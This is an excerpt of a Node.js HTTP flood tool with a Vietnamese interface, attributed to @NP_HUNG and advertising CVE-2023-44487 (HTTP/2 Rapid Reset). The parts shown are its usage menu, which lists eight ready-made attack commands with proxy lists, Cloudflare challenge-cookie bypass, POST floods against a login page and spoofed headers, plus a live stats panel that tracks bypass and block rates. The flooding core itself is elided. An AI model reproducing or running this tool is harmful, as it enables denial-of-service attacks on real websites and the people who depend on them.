...
// ==================== MENU HIỂN THỊ KHI THIẾU THAM SỐ ====================
...
`.magenta.bold);
    ...
    console.log(`\n${'█'.repeat(95).yellow}`);
    console.log(`  ${'📋 CÚ PHÁP:'.bold.white} node ${process.argv[1]} ${'<GET/POST> <target> <time> <threads> <ratelimit> <proxy> [options] --winter'.cyan}`);
    console.log(`${'█'.repeat(95).yellow}\n`);

    console.log(`${'✨ CÁC TÙY CHỌN (OPTIONS):'.bold.green}`);
    console.log(`  ${'--winter'.yellow}          Bắt buộc - Kích hoạt tấn công`);
    console.log(`  ${'--query 1/2/3'.yellow}     Query random (1: cf_chl, 2: random, 3: q=random)`);
    console.log(`  ${'--cookie "value"'.yellow}  Cookie tùy chỉnh (hỗ trợ %RAND% random)`);
    console.log(`  ${'--full'.yellow}            Bật chế độ backend lớn (Amazon, Akamai, Cloudflare)`);
    console.log(`  ${'--http 1/2/mix'.yellow}    Chọn giao thức (1: HTTP/1.1, 2: HTTP/2, mix: auto)`);
    console.log(`  ${'--debug'.yellow}           Hiển thị chi tiết status code và RPS`);
    console.log(`  ${'--delay <ms>'.yellow}      Độ trễ giữa các request (1-1000ms)`);
    console.log(`  ${'--postdata "data"'.yellow} Dữ liệu gửi đi với method POST`);
    console.log(`  ${'--referer "url"'.yellow}   Referer tùy chỉnh (dùng "rand" để random)`);
    console.log(`  ${'--useragent "ua"'.yellow}  User-Agent tùy chỉnh`);
    console.log(`  ${'--header "k:v#k2:v2"'.yellow} Header tùy chỉnh, phân cách bằng #`);
    console.log(`  ${'--randrate'.yellow}        Random rate tự động (1-90 req/s)`);
    console.log(`  ${'--ip ip:port'.yellow}      Dùng 1 IP proxy cố định thay vì file`);

    console.log(`\n${'█'.repeat(95).yellow}`);
    console.log(`  ${'📌 VÍ DỤ CỤ THỂ:'.bold.white}`);
    console.log(`${'█'.repeat(95).yellow}`);

    console.log(`\n  ${'🔹 Ví dụ 1: Tấn công cơ bản nhất'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com" 60 4 30 proxy.txt --winter\n`);

    console.log(`  ${'🔹 Ví dụ 2: Tấn công mạnh với full mode + HTTP/2'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com" 120 16 100 proxy.txt --full --http 2 --winter\n`);

    console.log(`  ${'🔹 Ví dụ 3: Bypass Cloudflare với cookie + query'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com?q=%RAND%" 300 8 50 proxy.txt --cookie "cf_clearance=xxx" --query 1 --winter\n`);

    console.log(`  ${'🔹 Ví dụ 4: Debug mode xem chi tiết status code'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com" 30 2 20 proxy.txt --debug --winter\n`);

    console.log(`  ${'🔹 Ví dụ 5: POST flood có dữ liệu'.cyan}`);
    console.log(`     node ${process.argv[1]} POST "https://target.com/login" 60 4 40 proxy.txt --postdata "user=admin&pass=123" --referer "https://google.com" --winter\n`);

    console.log(`  ${'🔹 Ví dụ 6: Mix protocol + random useragent'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com" 240 12 80 proxy.txt --http mix --useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --winter\n`);

    console.log(`  ${'🔹 Ví dụ 7: Custom header + delay nhẹ'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com" 180 8 60 proxy.txt --header "X-Forwarded-For:1.1.1.1#X-Custom:value" --delay 5 --winter\n`);

    console.log(`  ${'🔹 Ví dụ 8: Dùng 1 proxy cố định'.cyan}`);
    console.log(`     node ${process.argv[1]} GET "https://target.com" 60 4 30 proxy.txt --ip "1.2.3.4:8080" --winter\n`);

    console.log(`${'█'.repeat(95).yellow}`);
    console.log(`  ${'⚠️  LƯU Ý:'.bold.red}`);
    console.log(`     • ${'--winter'.red} là bắt buộc để kích hoạt flood!`);
    console.log(`     • Proxy phải có định dạng ${'ip:port'.yellow} mỗi dòng`);
    console.log(`     • Threads khuyến nghị không quá số core CPU`);
    console.log(`     • Dùng ${'--debug'.yellow} để theo dõi hiệu quả tấn công`);
    console.log(`${'█'.repeat(95).yellow}\n`);
...
║   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝           ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝  ║
║                                                                              ║
║                   🔥 OPTIMIZED HTTP/2 RAPIDREST STREAM 🔥                    ║
║                        CVE-2023-44487 | GOAWAY FIXED                         ║
║                               By @NP_HUNG                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
`);

    console.log(`\n${'█'.repeat(70).gray}`);
    console.log(`  ${'🎯 TARGET'.bold.cyan}     : ${target}`);
    console.log(`  ${'⏱️  TIME'.bold.cyan}       : ${time} giây`);
    console.log(`  ${'🧵 THREADS'.bold.cyan}     : ${threads} workers`);
    console.log(`  ${'⚡ RATELIMIT'.bold.cyan}   : ${ratelimit} req/s`);
    console.log(`  ${'🔧 MODE'.bold.cyan}        : ${forceHttp === 2 ? 'HTTP/2' : forceHttp === 1 ? 'HTTP/1.1' : 'AUTO (H2/H1.1)'}`);
    console.log(`  ${'🛡️  FULL'.bold.cyan}       : ${isFull ? 'BẬT (Backend lớn)' : 'TẮT'}`);
    console.log(`  ${'🍪 COOKIE'.bold.cyan}      : ${hcookie ? hcookie.substring(0, 40) + '...' : 'Không'}`);
    console.log(`  ${'📦 PROXY'.bold.cyan}       : ${proxy.length} proxy đã tải`);
    ...
    if (debugMode) {
        ...
        setInterval(() => {
            ...
            const currentRPS = deltaTime > 0 ? Math.round((total - lastTotal) / deltaTime) : 0;
            lastTotal = total;
            lastTime = now;
            ...
            console.log(`\n${'╔' + '═'.repeat(78) + '╗'.bold.cyan}`);
            console.log(`${'║'.bold.cyan}  🔥 OPTIMIZED ATTACK STATUS - ' + new Date().toLocaleString('vi-VN') + ' '.padEnd(37) + '║'.bold.cyan}`);
            console.log(`${'╠' + '═'.repeat(78) + '╣'.bold.cyan}`);
            console.log(`${'║'.bold.cyan}  📊 TOTAL RPS: ${currentRPS.toString().padStart(6).bold.green}  │  ✅ BYPASS: ${bypassRate.padStart(5)}%  │  ❌ BLOCK: ${blockRate.padStart(5)}%  │  ⏱️  TIME: ${timeStr.padStart(8)}  ║`.bold.cyan);
            console.log(`${'╠' + '═'.repeat(78) + '╣'.bold.cyan}`);
            console.log(`${'║'.bold.cyan} │ STATUS │${' COUNT '.padStart(12)}│${' % '.padStart(8)}│ GRAPH                                      ║`.bold.cyan);
            console.log(`${'╠' + '═'.repeat(78) + '╣'.bold.cyan}`);
            
            for (let [code, count] of sortedStatuses.slice(0, 12)) {
                ...
                let colorBar;
                if (code === 'GOAWAY') {
                    coloredCode = `│ ${code.padEnd(6)}`.magenta;
                    colorBar = bar.magenta;
                } else if (code.startsWith('2')) {
                    coloredCode = `│ ${code.padEnd(6)}`.green;
                    colorBar = bar.green;
                } else if (code.startsWith('3')) {
                    coloredCode = `│ ${code.padEnd(6)}`.cyan;
                    colorBar = bar.cyan;
                } else if (code.startsWith('4')) {
                    coloredCode = `│ ${code.padEnd(6)}`.yellow;
                    colorBar = bar.yellow;
                } else if (code.startsWith('5')) {
                    coloredCode = `│ ${code.padEnd(6)}`.red;
                    colorBar = bar.red;
                } else {
                    coloredCode = `│ ${code.padEnd(6)}`.gray;
                    colorBar = bar.gray;
                }
                
                console.log(`${'║'.bold.cyan}${coloredCode} │ ${count.toString().padStart(8).white} │ ${percentage.padStart(5)}% │ ${colorBar} ║`.bold.cyan);
            }
            
            if (sortedStatuses.length > 12) {
                console.log(`${'║'.bold.cyan}  ... và ${sortedStatuses.length - 12} status khác ${' '.repeat(50)}║`.bold.cyan);
            }
            ...
            const fixRate = (100 - parseFloat(goawayRate)).toFixed(1);
            
            console.log(`${'║'.bold.cyan}  💾 RAM: ${usedMemPercent}% / 100% ${'█'.repeat(Math.floor(usedMemPercent/2.5)).green}${'░'.repeat(40-Math.floor(usedMemPercent/2.5)).gray} ${'║'.bold.cyan}`);
            console.log(`${'║'.bold.cyan}  🔧 GOAWAY FIX: ${fixRate}% (${goawayCount} GOAWAY) ${'█'.repeat(Math.floor(fixRate/2.5)).green}${'░'.repeat(40-Math.floor(fixRate/2.5)).gray} ${'║'.bold.cyan}`);
            console.log(`${'╚' + '═'.repeat(78) + '╝'.bold.cyan}`);
            
            if (usedMemPercent >= 85) {
                console.log(`\n${'⚠️  CẢNH BÁO: RAM sử dụng quá cao ('.red}${usedMemPercent}%${')! Có thể bị treo máy!'.red}`);
            }
            if (currentRPS < ratelimit * threads * 0.5) {
                console.log(`\n${'⚠️  HIỆU SUẤT THẤP: RPS chỉ đạt '.yellow}${Math.round((currentRPS/(ratelimit*threads))*100)}%${' so với mục tiêu!'.yellow}`);
            }
    ...
    setTimeout(() => {
        console.log(`\n${'╔' + '═'.repeat(78) + '╗'.bold.red}`);
        console.log(`${'║'.bold.red}  🛑 KẾT THÚC TẤN CÔNG - ĐÃ CHẠY ĐỦ ${time} GIÂY 🛑${' '.repeat(78 - 38 - time.toString().length)}║`.bold.red);
        console.log(`${'╚' + '═'.repeat(78) + '╝'.bold.red}`);
        process.exit(1);
    }, time * 1000);
